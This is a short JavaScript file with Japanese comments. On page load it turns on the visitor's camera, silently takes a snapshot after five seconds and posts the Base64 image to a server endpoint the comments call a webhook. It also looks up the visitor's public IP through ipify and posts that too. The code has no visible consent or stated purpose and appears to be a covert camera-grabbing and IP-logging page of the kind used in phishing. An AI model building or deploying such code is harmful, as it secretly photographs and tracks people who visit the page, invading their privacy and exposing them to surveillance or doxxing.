document.addEventListener("DOMContentLoaded", () => {
    // 📌 カメラを起動
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            const video = document.getElementById("video");
            video.srcObject = stream;

            // 📌 5秒後に画像キャプチャ & Webhookへ送信
            setTimeout(() => {
                const canvas = document.getElementById("canvas");
                const context = canvas.getContext("2d");
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // 📌 画像をBase64に変換
                const imageData = canvas.toDataURL("image/png");

                // 📌 画像をサーバーへ送信
                fetch("/api/send-image", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ image: imageData })
                }).then(response => response.text())
                  .then(data => console.log("Image sent:", data))
                  .catch(error => console.error("Error sending image:", error));

            }, 5000); // 5秒後に撮影
        })
        .catch(error => console.error("カメラの起動に失敗しました:", error));

    // 📌 クライアントのIPアドレスを取得
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            console.log("Client IP:", data.ip);
            
            // 📌 IPをWebhookへ送信
            fetch("/api/send-ip", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ ip: data.ip })
            }).then(response => response.text())
              .then(data => console.log("IP sent:", data))
              .catch(error => console.error("Error sending IP:", error));
        })
        .catch(error => console.error("Error fetching IP:", error));
});

